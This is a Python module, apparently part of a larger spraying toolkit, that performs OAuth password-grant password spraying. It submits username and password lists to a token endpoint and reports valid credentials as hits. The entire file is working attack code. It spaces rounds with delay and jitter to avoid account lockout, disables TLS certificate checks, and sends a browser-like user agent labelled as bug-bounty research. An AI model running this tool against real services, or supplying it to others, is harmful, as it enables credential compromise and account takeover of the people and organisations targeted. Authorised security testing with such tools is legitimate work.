#!/usr/bin/env python3
"""
OAuth password grant spray module.

POST application/x-www-form-urlencoded to TARGET_URL with:
    grant_type=password
    username=<user>
    password=<pass>
    [client_id=<id>]
    [client_secret=<secret>]
    [scope=<scope>]

Success = HTTP 200 with "access_token" present in JSON response.
Failure = HTTP 4xx (typically 400 "invalid_grant" or 401).

NOT a standalone entry point. Spawned by tools/spray_orchestrator.sh.

Env contract (set by orchestrator):
  SPRAY_TARGET_URL        OAuth /token endpoint
  SPRAY_USERS_FILE        one username per line
  SPRAY_PASSES_FILE       one password per line
  SPRAY_OAUTH_CLIENT_ID       (optional) client_id
  SPRAY_OAUTH_CLIENT_SECRET   (optional) client_secret
  SPRAY_OAUTH_SCOPE           (optional) scope string
  SPRAY_DELAY                 seconds between rounds
  SPRAY_JITTER                ± seconds added to delay
  SPRAY_CONTINUE_ON_HIT       "true" to keep going after first valid creds
  AUDIT_LOG                   JSONL output path
"""
from __future__ import annotations
import hashlib
import json
import os
import random
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Bug-Bounty-Research"


def env(name: str, default: str = "") -> str:
    return os.environ.get(name, default)


def env_required(name: str) -> str:
    v = os.environ.get(name)
    if not v:
        print(f"[-] Missing required env var: {name}", file=sys.stderr)
        sys.exit(1)
    return v


def read_lines(path: str) -> list[str]:
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]


def sha256_prefix(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8")).hexdigest()[:12]


def audit(record: dict) -> None:
    record["ts"] = datetime.now(timezone.utc).isoformat()
    with open(AUDIT_LOG_PATH, "a") as f:
        f.write(json.dumps(record) + "\n")


def attempt(url: str, user: str, password: str,
            client_id: str, client_secret: str, scope: str) -> dict:
    fields = {
        "grant_type": "password",
        "username": user,
        "password": password,
    }
    if client_id:
        fields["client_id"] = client_id
    if client_secret:
        fields["client_secret"] = client_secret
    if scope:
        fields["scope"] = scope

    body = urllib.parse.urlencode(fields).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=body,
        headers={
            "User-Agent": USER_AGENT,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
        },
        method="POST",
    )

    start = time.time()
    status = 0
    has_token = False
    error_descr = None
    try:
        with urllib.request.urlopen(req, timeout=15, context=SSL_CTX) as resp:
            status = resp.status
            data = json.loads(resp.read().decode("utf-8", errors="replace"))
            has_token = "access_token" in data
    except urllib.error.HTTPError as e:
        status = e.code
        try:
            data = json.loads(e.read().decode("utf-8", errors="replace"))
            error_descr = data.get("error_description") or data.get("error")
        except Exception:
            pass
    except Exception as e:
        return {
            "status_code": 0,
            "looks_like_success": False,
            "error": str(e),
            "duration_ms": int((time.time() - start) * 1000),
        }

    return {
        "status_code": status,
        "looks_like_success": has_token,
        "error_descr": error_descr,
        "duration_ms": int((time.time() - start) * 1000),
    }


def main() -> int:
    global AUDIT_LOG_PATH
    AUDIT_LOG_PATH = env_required("AUDIT_LOG")

    url           = env_required("SPRAY_TARGET_URL")
    users_file    = env_required("SPRAY_USERS_FILE")
    passes_file   = env_required("SPRAY_PASSES_FILE")
    client_id     = env("SPRAY_OAUTH_CLIENT_ID")
    client_secret = env("SPRAY_OAUTH_CLIENT_SECRET")
    scope         = env("SPRAY_OAUTH_SCOPE")
    delay         = int(env("SPRAY_DELAY", "1800"))
    jitter        = int(env("SPRAY_JITTER", "60"))
    continue_hit  = env("SPRAY_CONTINUE_ON_HIT") == "true"

    users    = read_lines(users_file)
    passwords = read_lines(passes_file)

    print(f"[+] OAuth password-grant spray: {url}")
    print(f"[+] {len(users)} users × {len(passwords)} passwords = {len(users)*len(passwords)} attempts")
    print(f"[+] client_id: {'set' if client_id else 'none'}, scope: {scope or 'none'}")
    print(f"[+] Audit log: {AUDIT_LOG_PATH}")
    print()

    hits: list[tuple[str, str]] = []

    for round_idx, password in enumerate(passwords, 1):
        print(f"=== Round {round_idx}/{len(passwords)} — testing {len(users)} users ===")

        for user in users:
            res = attempt(url, user, password, client_id, client_secret, scope)
            audit({
                "round": round_idx,
                "user": user,
                "pwd_sha256_prefix": sha256_prefix(password),
                "status_code": res["status_code"],
                "looks_like_success": res["looks_like_success"],
                "error_descr": res.get("error_descr"),
                "duration_ms": res["duration_ms"],
                "error": res.get("error"),
            })

            if res["looks_like_success"]:
                hits.append((user, password))
                print(f"    \033[0;32m[HIT]\033[0m {user}  (status {res['status_code']}, access_token present)")
                if not continue_hit:
                    print("[+] Hit found and --continue-on-hit not set; stopping.")
                    _summary(hits, passwords, round_idx)
                    return 0

        if round_idx < len(passwords):
            wait = delay + random.randint(-jitter, jitter)
            print(f"    [*] Round done. Sleeping {wait}s before next round...")
            time.sleep(max(1, wait))

    _summary(hits, passwords, len(passwords))
    return 0


def _summary(hits, all_passes, rounds_done):
    print()
    print("=" * 50)
    print("  OAuth Password-Grant Spray Summary")
    print("=" * 50)
    print(f"  Rounds completed: {rounds_done}/{len(all_passes)}")
    print(f"  Hits found:       {len(hits)}")
    for user, pwd in hits:
        print(f"    {user}  (pwd-sha256-prefix: {sha256_prefix(pwd)})")
    print(f"  Audit log:        {AUDIT_LOG_PATH}")
    print("=" * 50)


if __name__ == "__main__":
    sys.exit(main())
